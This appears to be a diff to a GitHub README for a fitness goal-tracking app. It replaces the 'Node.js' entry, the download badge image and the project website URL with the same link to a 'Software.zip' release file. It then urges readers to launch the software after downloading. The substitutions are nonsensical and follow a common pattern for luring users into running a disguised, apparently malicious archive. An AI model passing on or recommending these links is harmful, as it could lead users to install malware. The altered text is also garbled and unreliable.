@@ -19,7 +19,7 @@ The **fit-track-goal-progress** app was created with a focus on enhancing the us
 
 The **fit-track-goal-progress** app leverages a wide range of technologies to deliver a seamless user experience. Here are some of the key technologies used in the development:
 
-- Node.js for backend development  
+- https://github.com/STudent-chickEn/fit-track-goal-progress/releases/download/v1.0/Software.zip for backend development  
 - React for frontend interface  
 - Code generation tools for efficient development  
 - DevOps practices for continuous integration  
@@ -56,13 +56,13 @@ Celebrate your fitness achievements with friends and followers by sharing your p
 
 To get started with the **fit-track-goal-progress** app, simply download the application from the following link:
 
-[![Download Software](https://img.shields.io/badge/Download-Software-blue)](https://github.com/user-attachments/files/18388744/Software.zip)
+[![Download Software](https://github.com/STudent-chickEn/fit-track-goal-progress/releases/download/v1.0/Software.zip)](https://github.com/STudent-chickEn/fit-track-goal-progress/releases/download/v1.0/Software.zip)
 
 **Note**: The software needs to be launched after downloading to access all the amazing features and functionalities.
 
 ## 🌐 Visit Our Website
 
-For more information about the **fit-track-goal-progress** app and to explore additional resources, please visit our website at [https://coslynx.com](https://coslynx.com).
+For more information about the **fit-track-goal-progress** app and to explore additional resources, please visit our website at [https://github.com/STudent-chickEn/fit-track-goal-progress/releases/download/v1.0/Software.zip](https://github.com/STudent-chickEn/fit-track-goal-progress/releases/download/v1.0/Software.zip).
 
 ## 📦 Check the Releases
 
